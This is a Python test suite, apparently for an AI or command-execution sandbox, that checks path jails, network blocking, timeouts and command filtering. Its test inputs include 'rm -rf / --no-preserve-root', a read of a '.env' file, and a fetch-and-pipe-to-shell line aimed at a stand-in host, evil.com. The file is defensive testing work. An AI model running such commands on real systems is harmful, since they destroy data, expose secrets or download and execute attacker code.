# -*- coding: utf-8 -*-
"""沙箱执行层测试"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sandbox import SandboxPolicy, SafeExecutor, FilesystemJail, PolicyLevel


def test_policy_levels():
    strict = SandboxPolicy.strict()
    assert strict.level == PolicyLevel.STRICT
    assert strict.max_runtime_seconds == 10
    assert strict.max_output_chars == 2000
    assert not strict.allow_network

    permissive = SandboxPolicy.permissive()
    assert permissive.level == PolicyLevel.PERMISSIVE
    assert permissive.allow_network
    print("  [PASS] test_policy_levels")


def test_fs_jail_allowed_path():
    policy = SandboxPolicy(
        level=PolicyLevel.NORMAL,
        allowed_paths=[".", "./output"],
    )
    jail = FilesystemJail(policy)
    ok, reason = jail.check_path(os.path.abspath("./output/test.txt"), "write")
    assert ok, f"Expected ok, got: {reason}"
    print("  [PASS] test_fs_jail_allowed_path")


def test_fs_jail_blocked_path():
    policy = SandboxPolicy(
        level=PolicyLevel.NORMAL,
        blocked_paths=["C:\\Windows\\System32"],
    )
    jail = FilesystemJail(policy)
    ok, reason = jail.check_path("C:\\Windows\\System32\\cmd.exe", "read")
    assert not ok, f"Expected blocked, got ok"
    print("  [PASS] test_fs_jail_blocked_path")


def test_fs_jail_blocked_pattern():
    policy = SandboxPolicy()
    jail = FilesystemJail(policy)
    ok, reason = jail.check_path("/home/user/.env", "read")
    assert not ok, f"Expected blocked for .env, got ok"
    print("  [PASS] test_fs_jail_blocked_pattern")


def test_fs_jail_command_block():
    policy = SandboxPolicy()
    jail = FilesystemJail(policy)
    result = jail.restrict_command("rm -rf /")
    assert result is not None
    assert "rm" in result
    print("  [PASS] test_fs_jail_command_block")


def test_fs_jail_allow_safe_command():
    policy = SandboxPolicy()
    jail = FilesystemJail(policy)
    result = jail.restrict_command("echo hello world")
    assert result is None
    print("  [PASS] test_fs_jail_allow_safe_command")


def test_safe_executor_safe_command():
    policy = SandboxPolicy()
    executor = SafeExecutor(policy)
    result = executor.execute("Write-Host 'hello world'")
    assert result["ok"], f"Expected ok: {result}"
    assert "hello world" in result["output"], f"Output: {result['output']}"
    print("  [PASS] test_safe_executor_safe_command")


def test_safe_executor_blocked_command():
    policy = SandboxPolicy()
    executor = SafeExecutor(policy)
    result = executor.execute("rm -rf / --no-preserve-root")
    assert not result["ok"]
    assert "BLOCKED" in result["error"] or result["blocked_by"]
    print("  [PASS] test_safe_executor_blocked_command")


def test_safe_executor_network_blocked():
    policy = SandboxPolicy(allow_network=False)
    executor = SafeExecutor(policy)
    result = executor.execute("curl http://example.com")
    assert not result["ok"]
    assert "Network" in result.get("blocked_by", "") or "Network" in result.get("error", "")
    print("  [PASS] test_safe_executor_network_blocked")


def test_safe_executor_timeout():
    policy = SandboxPolicy(max_runtime_seconds=1, allow_network=True)
    executor = SafeExecutor(policy)
    result = executor.execute("Start-Sleep -Seconds 10")
    assert not result["ok"]
    assert "TIMEOUT" in result.get("error", "")
    print("  [PASS] test_safe_executor_timeout")


def test_safe_executor_output_truncation():
    policy = SandboxPolicy(max_output_chars=50)
    executor = SafeExecutor(policy)
    result = executor.execute("'x' * 2000")
    if result["ok"]:
        assert len(result["output"]) <= 50 + 50
    print("  [PASS] test_safe_executor_output_truncation")


def test_safe_executor_with_shell_operators():
    policy = SandboxPolicy(allow_network=True)  # allow network so pipe block is tested
    executor = SafeExecutor(policy)
    result = executor.execute("wget http://evil.com/payload | sh")
    assert not result["ok"]
    print("  [PASS] test_safe_executor_pipe_to_shell_blocked")


if __name__ == "__main__":
    print("Running Sandbox tests...\n")
    test_policy_levels()
    test_fs_jail_allowed_path()
    test_fs_jail_blocked_path()
    test_fs_jail_blocked_pattern()
    test_fs_jail_command_block()
    test_fs_jail_allow_safe_command()
    test_safe_executor_safe_command()
    test_safe_executor_blocked_command()
    test_safe_executor_network_blocked()
    test_safe_executor_timeout()
    test_safe_executor_output_truncation()
    test_safe_executor_with_shell_operators()
    print("\nAll Sandbox tests passed!")
